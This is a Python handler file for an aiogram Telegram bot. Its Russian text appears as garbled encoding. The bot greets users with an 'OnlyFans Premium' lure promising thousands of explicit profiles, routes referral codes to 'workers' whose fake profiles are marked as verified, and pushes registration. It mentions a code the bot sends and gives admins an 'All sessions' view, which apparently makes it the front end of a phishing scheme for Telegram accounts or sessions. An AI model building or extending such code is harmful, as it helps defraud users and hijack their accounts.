import os
from aiogram import Router, Bot, F, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.utils.keyboard import InlineKeyboardBuilder

from handlers.states import AdminStates
from handlers.utils import admin_ids, format_with_emoji, get_worker_by_ref, worker_profiles, referred_users

# –°–æ–∑–¥–∞–µ–º —Ä–æ—É—Ç–µ—Ä
router = Router()

@router.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext, bot: Bot):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–æ–º–∞–Ω–¥—ã /start"""
    user_id = str(message.from_user.id)
    args = message.text.split()
    ref_code = None
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ ref –∫–æ–¥–∞ –≤ –∞—Ä–≥—É–º–µ–Ω—Ç–∞—Ö
    if len(args) > 1 and args[1].startswith("ref_"):
        ref_code = args[1]
        worker_id = get_worker_by_ref(ref_code)
        
        # –ï—Å–ª–∏ –Ω–∞–π–¥–µ–Ω –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã–π —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω—ã–π –∫–æ–¥
        if worker_id and worker_id in worker_profiles:
            # –ó–∞–ø–∏—Å—ã–≤–∞–µ–º, —á—Ç–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø—Ä–∏—à–µ–ª –ø–æ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–æ–π —Å—Å—ã–ª–∫–µ
            referred_users[user_id] = worker_id
            
            # –ü–æ–ª—É—á–∞–µ–º –ø—Ä–æ—Ñ–∏–ª—å —Ä–∞–±–æ—Ç–Ω–∏–∫–∞
            profile = worker_profiles[worker_id]
            
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∞–Ω–∫–µ—Ç—É —Ä–∞–±–æ—Ç–Ω–∏–∫–∞
            await message.answer_photo(
                photo=profile["photo_id"],
                caption=(
                    f"*üëã –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å!*\n\n"
                    f"üë© *–ò–º—è:* {profile['name']}\n"
                    f"üßç *–ü–æ–¥–ø–∏—Å—á–∏–∫–∏:* {profile['followers']}\n"
                    f"üì∑ *–§–æ—Ç–æ:* {profile['photos_count']}\n"
                    f"üé¶ *–í–∏–¥–µ–æ:* {profile['videos_count']}\n\n"
                    f"üïî *–î–∞—Ç–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏:* {profile['date']}\n"
                    f"üìá *–ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–æ–π–¥–µ–Ω–∞:* ‚úÖ\n\n"
                    f"*–î–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–æ–Ω—Ç–µ–Ω—Ç—É –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è:*"
                ),
                reply_markup=InlineKeyboardBuilder().button(
                    text="üìù –ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è", callback_data="register"
                ).as_markup(),
                parse_mode="Markdown"
            )
            return
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∞–¥–º–∏–Ω–æ–º
    if user_id in admin_ids:
        print(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} ({message.from_user.full_name}) —è–≤–ª—è–µ—Ç—Å—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º")
        await show_admin_panel(message, state)
        return
    
    # –î–ª—è –æ–±—ã—á–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–∏–µ
    await state.clear()
    
    # –§–æ—Ä–º–∏—Ä—É–µ–º –ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ —Å —ç–º–æ–¥–∑–∏ (–±–æ–ª–µ–µ —Å–¥–µ—Ä–∂–∞–Ω–Ω–æ)
    welcome_text = f"""
–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {message.from_user.full_name}

OnlyFans Premium - –£ –Ω–∞—Å –≤—ã –Ω–∞–π–¥–µ—Ç–µ –±–æ–ª–µ–µ 10.000 –¥–µ–≤—É—à–µ–∫ –∏ –º–æ—Ä–µ –æ—Ç–∫—Ä–æ–≤–µ–Ω–Ω—ã—Ö –∞–Ω–∫–µ—Ç

–î–ª—è –Ω–∞—á–∞–ª–∞ –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è –ø –∫–Ω–æ–ø–∫–µ —Å–Ω–∏–∑—É.

–í–ù–ò–ú–ê–ù–ò–ï: –ï—Å–ª–∏ –±–æ—Ç –Ω–µ –ø—Ä–∏—Å–ª–∞–ª –≤–∞–º –∫–æ–¥, –ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç–µ –µ–≥–æ –∫–æ–º–∞–Ω–¥–æ–π /start
"""
    
    # –ü—Ä–∏–º–µ–Ω—è–µ–º —Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Å —ç–º–æ–¥–∑–∏
    formatted_text = format_with_emoji(welcome_text)
    
    # –°–æ–∑–¥–∞–µ–º –∏–Ω–ª–∞–π–Ω –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É
    kb = InlineKeyboardBuilder()
    kb.button(text="üìù –ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è", callback_data="register")
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è
    image_path = "images/start.png"
    if os.path.exists(image_path):
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ —Å —Ç–µ–∫—Å—Ç–æ–º –∏ –∫–Ω–æ–ø–∫–æ–π
        with open(image_path, "rb") as photo_file:
            # –ü—Ä–∞–≤–∏–ª—å–Ω–æ –∏—Å–ø–æ–ª—å–∑—É–µ–º InputFile –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ç–æ
            await message.answer_photo(
                photo=types.BufferedInputFile(
                    photo_file.read(),
                    filename="start.png"
                ),
                caption=formatted_text,
                reply_markup=kb.as_markup(),
                parse_mode="Markdown"
            )
    else:
        # –ï—Å–ª–∏ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è –Ω–µ—Ç, –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç–æ–ª—å–∫–æ —Ç–µ–∫—Å—Ç —Å –∫–Ω–æ–ø–∫–æ–π
        await message.answer(
            formatted_text,
            reply_markup=kb.as_markup(),
            parse_mode="Markdown"
        )

async def show_admin_panel(message: types.Message, state: FSMContext):
    """–ü–æ–∫–∞–∑—ã–≤–∞–µ—Ç –ø–∞–Ω–µ–ª—å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞"""
    from handlers.utils import admin_notifications
    
    await state.set_state(AdminStates.admin_menu)
    
    # –°–æ–∑–¥–∞–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É –∞–¥–º–∏–Ω–∞
    kb = InlineKeyboardBuilder()
    kb.button(text="üìÅ –í—Å–µ —Å–µ—Å—Å–∏–∏", callback_data="all_sessions")
    
    # –ö–Ω–æ–ø–∫–∞ –≤–∫–ª—é—á–µ–Ω–∏—è/–æ—Ç–∫–ª—é—á–µ–Ω–∏—è —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π
    notification_text = "üîï –û—Ç–∫–ª—é—á–∏—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è" if admin_notifications else "üîî –í–∫–ª—é—á–∏—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è"
    kb.button(text=notification_text, callback_data="toggle_notifications")
    
    # –†–∞—Å–ø–æ–ª–∞–≥–∞–µ–º –∫–Ω–æ–ø–∫–∏ –≤ —Å—Ç–æ–ª–±–∏–∫
    kb.adjust(1)
    
    # –§–æ—Ä–º–∏—Ä—É–µ–º —Å–ø–∏—Å–æ–∫ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–≤
    admin_list_text = ""
    for i, admin_id in enumerate(admin_ids, 1):
        admin_list_text += f"{i}. `{admin_id}`\n"
    
    await message.answer(
        "*üëë –ü–∞–Ω–µ–ª—å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞*\n\n"
        f"*–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—ã:*\n{admin_list_text}\n"
        "*–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:*",
        reply_markup=kb.as_markup(),
        parse_mode="Markdown"
    )

def register_start_router(dp):
    """–†–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ—Ç —Ä–æ—É—Ç–µ—Ä –≤ –¥–∏—Å–ø–µ—Ç—á–µ—Ä–µ"""
    dp.include_router(router) 